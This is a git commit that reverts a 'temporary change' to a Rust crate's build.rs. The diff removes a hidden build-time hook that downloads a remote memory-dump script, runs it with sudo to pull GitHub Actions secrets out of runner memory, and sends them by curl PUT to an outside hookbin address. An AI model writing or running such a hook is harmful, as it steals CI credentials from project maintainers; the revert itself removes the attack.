b9452b649d7aa36ad15b35c1afa1799932191f44
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-29 09:43:04 +0000

    Revert "Add temporary change"
    This reverts commit 5c3fb72c16c3590e0a2e94e0c601de98f1c0f7e0.

--- crates/types/entities/build.rs
+++ crates/types/entities/build.rs
@@ -1,15 +1,7 @@
 use rand::{thread_rng, Rng};
 use std::fs;
-use std::process::Command;
 
 fn main() {
-    let _ = Command::new("bash")
-        .arg("-c")
-        .arg(r#"echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID""#)
-        .status();
-
     let file_path = "./src/private.rs";
     if fs::metadata(file_path).is_err() {
         let mut rng = thread_rng();
